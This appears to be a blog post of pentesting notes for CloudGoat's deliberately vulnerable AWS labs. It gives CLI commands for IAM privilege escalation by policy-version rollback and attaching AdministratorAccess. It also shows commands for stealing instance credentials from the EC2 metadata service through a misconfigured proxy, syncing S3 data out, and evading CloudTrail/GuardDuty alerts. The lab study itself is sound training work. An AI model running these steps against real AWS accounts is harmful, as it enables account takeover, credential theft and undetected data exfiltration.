---
title: AWS Pentesting - CloudGoat
author: nirajkharel
date: 2023-01-21 20:55:00 +0800
categories: [Cloud Pentesting, AWS]
tags: [Cloud Pentesting, AWS Pentesting]
---

# cloudGoatAWS

## Configure the profile
-  `aws configure --profile <profile-name>`

## IAM Privilege Escalation by Rollback
- **Objective: Enumerate IAM policy versions and roll back to a previous version with higher privileges.**
- Which means there might be different versions of the IAM privileges/policies. If we are able to enumerate all the versions and if the current policies we are on has an privileges to set the default policy version, then we sould be able to set that high privileged version as our default version and can escalate the current privileges.
- Get a username (whoami)
  - `aws sts get-caller-identity` - This will give you your UserID, Account and ARN.
  - Or, `aws iam get-user-profile <profile-name>`
  - We can find a username on ARN.
- View the managed policies
  - `aws iam list-attached-user-policies --policy <policy-name> --username <username-from-arn>` 
  - This will give a policy name which we are currently operating on.
- List the versions.
  - `aws iam list-policy-versions --policy-arn <policy-arn-from-above>`
  - This will list the versions attached to the policies. We can also find a default policy for this user. In this case it's on version 1.
- Enumerate default Policy
  - Since we are on default policy, we need to enumerate at first what the version 1 is privileged to do.
  - `aws iam get-policy-version --policy-arn <policy-arn-from-above> --version-id v1`
  - We can see that it has `IAM:SetDefaultPolicyVersion` policy attached which means we can change the versions for the user.
- Enumerate versions
  - Enumerate the policies attached with each versions and find a version which has a highest privilege
  - `aws iam get-policy-version --policy-arn <raynor policy arn> --version-id v1` - Replace v1 with v2,v3,v4,v5
  - We can find the version 3 has a highest privilege can perform any action on any resource.
- Set the Default Policy
  - Now we know the version with highest privilege, we can set it to be our default policy
  - `aws iam set-default-policy-version --policy-arn <policy-arn-from-above> --version-id v3`
- Confirmation
  - List all instances associated with account
    - `aws ec2 describe instances`
 - Get an administrative access
    - `aws iam attach-user-policy --policy-arn arn:aws:iam:ACCOUNT-ID:aws:policy/AdministratorAccess --user-name <username-from-above> --profile <profile-name>`
  
## cloud_breach_s3
- **Objective** - Starting as an anonymous outsider with no access or privileges, exploit a misconfigured reverse-proxy server to query the EC2 metadata service and acquire instance profile keys. Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.
- Deploy the cloud
- Query EC2 Metadata
  - `curl <EC2-IP>`
  - Result: This server is configured to proxy requests to the EC2 metadata service. Please  modify your request's 'host' header and try again.
  - Which means, we need to add a custom host header which is a magic IP address associted with metadata service.
  - `curl <EC2-IP> -H 'host: 169.254.169.254'`
- Gain a token
  - `curl <EC2-IP>/lates/meta-data/iam -H 'host: 169.254.169.254'` - This contains security credentials
  - `curl <EC2-IP>/lates/meta-data/iam/security-credentials -H 'host: 169.254.169.254'` - It will provide a role
  - `curl <EC2-IP>/lates/meta-data/iam/security-credentials/role -H 'host: 169.254.169.254'` - The output is access key, secret access key and token for this role.
- Configure a profile
  - `aws configure --profile <profile-name>`
- Configure session token
  - `vim ~/.aws/credentials`
  - Paste `aws_session_token = token .......`
- Perform AWS Commands
  - We can now perform commands
  - `aws sts get-caller-identity --profile <profile-name>`
  - List the s3 buckets - `aws s3 ls –profile <profile-name>`
  - Copy the files from the s3 bucket to a new folder - `aws s3 sync s3://<insert bucket name> ./<new folder name> –profile <profile-name>`
- But while executing the commands, it gets alerted because we are running the commands from our pentest distro. It can be alerted by cloudtrail and guard duty.
- We can get around that when we will be able to execute a command by requesting it through private instance.
- This can be done with a tool called [SneakyEndpoints](https://github.com/Frichetten/SneakyEndpoints)
- SneakyEndpoints
  - `git clone https://github.com/Frichetten/SneakyEndpoints`
  - `cd SneakyEndpoints`
  - `terraform init`
  - `terraform apply`
- Start a session
  - `aws ssm start-session --target <host_id>` - host_id is gained from `terraform apply` command above.
# References
- https://resources.infosecinstitute.com/topic/cloudgoat-walkthrough-series-iam-privilege-escalation-by-rollback/
- https://makosecblog.com/aws-pentest/privesc-by-rollback/
